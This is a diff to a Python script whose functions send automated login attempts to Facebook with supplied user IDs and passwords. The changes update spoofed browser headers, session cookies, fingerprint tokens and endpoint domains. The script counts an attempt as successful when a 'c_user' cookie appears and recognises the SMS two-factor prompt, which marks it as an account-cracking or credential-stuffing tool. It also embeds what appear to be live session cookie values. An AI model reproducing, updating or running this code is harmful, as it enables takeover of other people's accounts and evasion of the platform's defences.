@@ -1179,9 +1179,9 @@ def mbasic(uid,pwx,tl):
             data = {
             'email': uid,
             'cuid': '',
-            'guid': 'f7d923be260ada3ea',
-            'lgnjs': '1733767601',
-            'lgnrnd': '100640_NiY9',
+            'guid': 'f8bd428c5a47bb4a0',
+            'lgnjs': '1734542439',
+            'lgnrnd': '092037_x7cM',
             'locale': 'en_GB',
             'login_source': 'comet_login_header',
             'next': 'https://www.facebook.com/gfgd',
@@ -1196,21 +1196,22 @@ def mbasic(uid,pwx,tl):
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
             'datr': '9VEvZ9JBwP-qDedVPM0RiFU2',
-            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnVzGp.AWUAJfrpnro',
+            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnYwKR.AWU2vbrpiKc',
             'sb': '9VEvZ6aV778dZuTY2EWKGHcM',
             'wd': '1440x402',
             'ps_l': '1',
-            'ps_n': '1',}
+            'ps_n': '1',
+            'locale': 'en_GB',}
             headers =  {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.5',
             'Content-Type': 'application/x-www-form-urlencoded',
-            'Origin': 'https://web.facebook.com',
+            'Origin': 'https://www.facebook.com',
             'DNT': '1',
-            'Alt-Used': 'web.facebook.com',
+            'Alt-Used': 'www.facebook.com',
             'Connection': 'keep-alive',
-            'Referer': 'https://web.facebook.com/gfgd',
+            'Referer': 'https://www.facebook.com/gfgd',
             'Upgrade-Insecure-Requests': '1',
             'Sec-Fetch-Dest': 'document',
             'Sec-Fetch-Mode': 'navigate',
@@ -1220,7 +1221,7 @@ def mbasic(uid,pwx,tl):
             'Pragma': 'no-cache',
             'Cache-Control': 'no-cache',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1'
+            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1296,15 +1297,16 @@ def p(uid,pwx,tl):
             'had_password_prefilled': 'true',
             'ab_test_data': 'A^%^2FAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA^%^2FA^%^2FAABAAG',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
-            cookies = {
+            cookies ={
             'datr': '9VEvZ9JBwP-qDedVPM0RiFU2',
-            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnX_Xl.AWUVP-a7E58',
+            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnYwRZ.AWUxHhrRid8',
             'sb': '9VEvZ6aV778dZuTY2EWKGHcM',
             'wd': '1440x402',
             'ps_l': '1',
             'ps_n': '1',
             'locale': 'en_GB',
-            'sfiu': 'AYhLIIz4ab42ADXpk8G_kVatArQyEbRVfRzx1xZPucgJldcd7BxY-lAp4CuemQColNt1iKlAsS9nqi_-3RPqqEEfL1FatzR_jF0fiRp48J2dyfVUgc-nsY5w6AKsddwD_OMW1nj4C37n7fzbJ_peuny-6yEs1NJ3M9Zp-jBl87jWV06lvhTBKZHILrkDh0sv9Hm83aZmPp2xT5xnm5j1jOpfj_LrTKmLSnEpuYNSoI0Y1-vNvWNnm3RlqbqXJb4XwgSCiiy8UfL0-n9qjT8xTmkX',}
+            'sfau': 'AYhB0BHbbAMFrW_W-gKZzbRIEs1Ie4lxvSY46B1EDI905LBuHNfZ6WneXe6Ms59MiRd9qtuD7t05aK40FPDYGFQkw7mP79_DzQN54rAaj_vTehHMVH0u6E5F832U3uMI8S7JAVXc8jDk-g0qDqg4fzawIeFPZYBrI5XP2mxaeXp66QozUgU-UhSsK7RPeT9X7qV1IJpfnTHJC9GLtuXT-KXKaxoK5ZJrHKs2SCnXcwuz6Yzn7ye0fc8D6tBDRH5MglESOJcbrXWPCdE2twSoczJnOdSKutvigH7_24AtDhiwkpXB7CTalGJETpMVAhIZqXE',
+            'sfiu': 'AYgf1nI2uQM69bvaDQQ6FfdyEZwvDgXYsRAUa-aTPyowhT_mnwtbvYNWwumqLVZXucs38ywbvGlz_wN5RxUeHOxk3DLmvHf_5LILNctPvtXe3baxdqY4DCseBnQtwQUnKVGvRNM7749CP79gD9Qvr6VXhI0ilMMfVpPBdNPsXxskX_BO-2pVNuylv6u88OUJYNO7gAy2ZIKrJakm9r85n0wcgDM2EQfHOJgYpJvqccRZPzoxocD9KlIiB_oSZ4MM0a2VNMa-1eqdioA4AM2BNL_PrPQFomXYHfMV8kqh68l8UZmItnXjUOs0mMixp_CsaIU',}
             headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
